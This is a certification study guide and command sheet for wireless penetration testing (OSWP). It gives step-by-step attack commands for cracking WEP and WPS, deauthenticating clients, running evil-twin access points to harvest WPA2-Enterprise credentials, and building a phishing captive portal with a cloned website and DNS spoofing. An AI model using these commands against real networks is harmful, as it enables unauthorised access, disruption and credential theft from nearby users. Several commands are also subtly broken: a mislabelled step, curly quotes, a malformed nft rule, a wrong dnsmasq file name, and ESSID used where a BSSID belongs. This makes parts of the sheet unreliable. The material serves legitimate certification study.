Study guide and command sheet for Offensive Security PEN-210 course (Offensive Security Wireless Pentester - OSWP)

# **Dependencies**

In order to run the following commands, install these frameworks first:

```
sudo apt install airmon-ng reaver hashcat hostapd dnsmasq nftables apache2 libapache2-mod-php freeradius
```

# **Open Network with MAC filtering**

In the event that fake authentication persistently fails, it is plausible that MAC address filtering is being employed. Under such a scheme, the Access Point (AP) will only permit connections from a predefined list of MAC addresses. Should this be the scenario, it will be necessary to acquire a legitimate MAC address by monitoring network traffic with the aid of Airodump-ng. Subsequently, impersonation of this MAC address should be carried out once the corresponding client has disconnected from the network. It is imperative to refrain from initiating a fake authentication attack targeting a specific MAC address if the client remains active on the AP.

**Packet capture**

```
airodump-ng -w <CAPTURE_NAME> -c <CHANNEL> --bssid <BSSID> <INTERFACE>
```

**Get your MAC address**

```
macchanger --show <INTERFACE>
```

**Fake authentication attack**

```
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
```

**ARP replay attack**

```
aireplay-ng -3 -b <BSSID> -h <YOUR_MAC> <INTERFACE>
```

**Deauthentication attack**

```
aireplay-ng -0 1 -a <BSSID> -c <CLIENT_MAC> <INTERFACE>
```

**Crack**

```
aircrack-ng <CAPTURE_NAME>
```

# **WEP (Wired Equivalent Privacy)**

WEP is a severely flawed security algorithm for IEEE 802.11 wireless networks. Below are the steps to exploit WEP vulnerabilities:

**Step 1: Kill conflicting processes**

```
sudo airmon-ng check kill
```

**Step 2: Start monitor mode on wlan0**

```
sudo airmon-ng start wlan0
```

**Step 3: Scan for WEP networks**

```
sudo airodump-ng wlan0mon --encrypt WEP
```

**Step 4: Capture IVs**

```
besside-ng -c Channel -b BSSID wlan0mon
```

**Step 5: Crack WEP key**

```
aircrack-ng ./wep.cap
```

# **WPS (Wi-Fi Protected Setup)**

WPS was originally known as Wi-Fi Simple Configuration, aiming to unify vendor technologies for secure WPA/WPA2 passphrase sharing. However, it has its set of vulnerabilities. Below are the steps to identify and exploit WPS vulnerabilities:

**Identifying access points with WPS enabled**

```
wash -i <INTERFACE> -s
```

**Fake authentication attack**

```
aireplay-ng -1 0 -e <ESSID> -a <BSSID> -h <YOUR_MAC> <INTERFACE>
```

**Offline brute force (pixie dust)**

```
reaver -i wlan0 -b BSSID -SNLAvv  -c 1 -K
```

**Online brute force**

```
reaver -i <INTERFACE> -b <BSSID> -SNLAsvv -d 1 -r 5:3 -c <CHANNEL_NUMBER>
```

# **WPA/WPA2/WPA3 Testing**

Steps for testing security on networks with WPA/WPA2/WPA3 encryption, including setting up rogue APs and capturing handshakes:

**WPA2 Enterprise**

Follow these steps to set up wireless monitoring and perform the attack.

**Step 1: Activate monitoring mode**

```
airmon-ng check kill && airmon-ng start <interface>
```

**Step 2: Check AUTH column**

```
airodump-ng <interface>
```

*Note: The AUTH column will say MGT.*

**Step 3: Capture the handshake**

```
sudo airodump-ng -c channel -w ESSID interface
```

**Step 4: Deauthenticate the client to capture the handshake**

```
aireplay-ng -0 0 -a ESSID -c client_ESSID interface
```

**Step 5: Analyze with Wireshark or tshark**

After gathering the BSSID, ESSID, and channel:

- Use Wireshark or tshark with filters:or
    
    ```
    wlan.bssid==E8:9C:12:02:66:AA && eap && tls.handshake.certificate
    ```
    
    ```
    tls.handshake.type == 11,3
    ```
    

**Step 6: Save certificates using OpenSSL**

View the Packet Details in TLSv1 Record Layer >> Handshake Protocol >> Certificate:

```
openssl x509 -inform der -in cert.der -text
```

*Details needed for the attack include: Issuer information.*

**Step 6.5 (Optional): Convert the certificate to PEM format**

```
openssl x509 -inform der -in cert.der -outform pem -out output.crt
```

**Step 7: Set up FreeRADIUS server**

Install with:

```
sudo apt install freeradius
```

Edit the `ca.cnf` and `server.cnf` files to have less suspicious certificate authority fields.

```
sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
sudo mousepad /etc/freeradius/3.0/certs/server.cnf
```

Update the respective sections with the correct information.

**Step 8: Prepare the certificates**

Navigate to `/etc/freeradius/3.0/certs/` and run:

```
sudo rm dh && make
```

*Note: Ignore the error from FreeRADIUS if it expects other configurations.*

**Step 9: Configure hostapd-mana**

Edit `/etc/hostapd-mana/mana.conf` with the correct SSID, Certificate paths, and EAP file.

**Step 10: Set up `mana.eap_user`**

Configure `/etc/hostapd-mana/mana.eap_user` with the desired protocols and authentication methods.

**Step 11: Start hostapd-mana**

```
hostapd-mana /etc/hostapd-mana/mana.conf
```

**Step 12: Use asleap to find a user**

Run asleap with the correct command to find a user with a successful login.

```
<asleap command> -W /usr/share/john/password.lst
```

**Step 13: Create `wpa_supplicant.conf` file**

Add the network configuration details:

```
network={
  ssid="NetworkName"
  scan_ssid=1
  key_mgmt=WPA-EAP
  identity="Domain\\username"
  password="password"
  eap=PEAP
  phase1="peaplabel=0"
  phase2="auth=MSCHAPV2"
}
```

**Step 14: Connect to the network**

Use `wpa_supplicant` to connect:

```
wpa_supplicant -c <config file>
```

# **Rogue Access Points**

Instructions for creating a rogue AP.

**Discovery**

```
sudo airodump-ng -w capturename –output-format pcap wlan0mon
```

**Wireshark Filters:**

```
wlan.fc.type_subtype == 0x08 #Broadcast Frames
wlan.ssid == “apname” #AP name
```

Filters can be appended to filter for broadcast frames from a specific AP:

```
wlan.fc.type_subtype == 0x08 && wlan.ssid == “apname”
```

The interesting parts are in Tag: Vendor Specific: & Tag: RSN: Information

**Creating a Rogue AP**

Hostapd-mana template location:

```
/etc/hostapd-mana/hostapd-mana.conf
```

Or you may download the hostapd-mana.config in this repository and modify to your needs.

Start hostapd-mana:

```
sudo hostapd-mana hostapd-mana.conf
```

**Cracking .hccapx Files**

**aircrack:**

```
aircrack-ng name.hccapx -w /wordlist/rockyou.txt
```

If you run into errors, you may try:

```
aircrack-ng name.hccapx -e ESSID -w /wordlist/rockyou.txt
```

**hashcat:**

```
hashcat -m 2500 capture.hccapx /usr/share/worlists/rockyou.txt

```

# **Attacking Captive Portals**

This guide provides step-by-step instructions for setting up a wireless network monitoring and attack environment.

**1. Set Interface to Monitor Mode**

Begin by capturing information about clients and access points (APs) around you:

```
sudo airodump-ng wlan0mon
```

**2. Adjust the Capture**

To specify the capture details, use:

```
sudo airodump-ng -w fileName –output-format pcap -c channelnumber interface
```

**3. De-authenticate Connected Devices**

Wait until the WPA handshake is captured:

```
sudo aireplay-ng -0 amountOfdeauths -a ApBSSID interface
```

**4. Disable Monitor Mode**

After completing the capture, disable monitor mode:

```
sudo apt install apache2 libapache2-mod-php
```

**5. Download the Example Page**

Use `wget` to download the webpage. Here, `-l2` means to go 2 levels deep:

```
wget -r -l2 https://www.website.com
```

**6. Prepare the Web Directory**

Create a directory for the phishing webpage:

```
sudo mkdir /var/www/html/portal && sudo mousepad /var/www/html/portal/index.php
```

**7. Replicate the Website's Style**

Replicate the styling of the example website page and copy the assets:

```
sudo cp -r ./www.website.com/assets /var/www/html/portal
```

**8. Set Up the Login Page**

Configure the login page to redirect to `login_check.php`:

```
sudo mousepad /var/www/html/portal/login_check.php
```

**9. Assign an IP address and activate the interface:**

```
sudo ip addr add 192.168.87.1/24 dev wlan0
sudo ip link set wlan0 up
```

**10. Ensure dnsmasq is installed:**

```
sudo apt install dnsmasq
```

**11. Create the DHCP config file at `/home/kali/dnsmasq.conf` and add spoofing entries for top-level domains:**

```
address=/com/192.168.0.1
address=/org/192.168.0.1
address=/net/192.168.0.1
```

**12. For Windows 7 & 10 captive portal detection, add:**

```
address=/dns.msftncsicom/131.107.255.255
```

**13. Start dnsmasq with the config file:**

```
sudo dnsmasq –conf-file=dnsmasq.com
```

**14. Verify if dnsmasq is running successfully:**

```
sudo tail /var/log/syslog | grep dnsmasq
```

**15. Install nftables:**

```
sudo apt install nftables
```

**16. Add required rules:**

```
sudo nft add table ip nat
sudo nft ‘add chain ip nat PREROUTING { type nat hook prerouting priority dstnat; policy; accept; }’
sudo nft add rule ip nat PREROUTING iifname “wlan0” udp dport 53 counter redirect to :53
```

**17. Modify Apache configuration:**

```
sudo mousepad /etc/apache2/sites-enabled/000-default.conf
```

**18. Enable necessary modules and restart Apache:**

```
sudo a2enmod rewrite && sudo a2enmod alias
sudo systemctl restart apache2
```

**19. Check the portal by navigating to:**

```
Firefox 127.0.0.1/portal/index.php
```

**20. Install hostapd and edit the configuration:**

```
sudo apt install hostapd && mousepad hostapd.conf
```

**21. Create and run a 802.11n AP:**

```
sudo hostapd -B hostapd.conf
```

**22. Monitor the logs in two separate terminals:**

- Terminal 1:

```
sudo tail -f /var/log/syslog | grep -E ‘(dnsmasq|hostapd)’
```

- Terminal 2:

```
sudo tail -f /var/log/apache2/access.log
```

**23. Search for passphrase files in `/tmp/`:**

```
sudo find /tmp/ -iname passphrase.txt
```

**24. Read the contents of the passphrase file:**

```
sudo cat /tmp/systemd-private-b37…aef-apache2.service-b...i/tmp/passphrase.txt
```

# **Information Discovery Example**

```
- ESSID of JesusIsTheWay
- BSSID of 34:5a:90:e0:5a:30
- WPS  (AES/CCM)
- Uses a PSK
- Runs on channel 1
```

# **Definitions**

- AP: Access Point
- BSSID: Basic Service Set Identifier is a 48-bit number that follows MAC address conventions.
- ESSID: Extended Service Set Identifier is a unique identifier to avoid interference on a wireless network.

# **Troubleshooting**

- Make sure that hostapd-mana is installed on Kali. Default installations currently feature hostapd, hostapd-wpa and hostapd_cli. None of these frameworks feature the *mana_wpaout* section in the *hostapd-mana.config*, and will result in error: *unknown configuration item 'mana_wpaout'*
- When starting the exam, fist thing after connecting to the .ovpn is to test both **SSH** and **RDP** protocols to ensure connection works as intended.
- In order to list wireless interfaces, execute command:

```
sudo airmon-ng
```

- To restart Network Manager, execute command:

```
systemctl restart NetworkManager.service
```
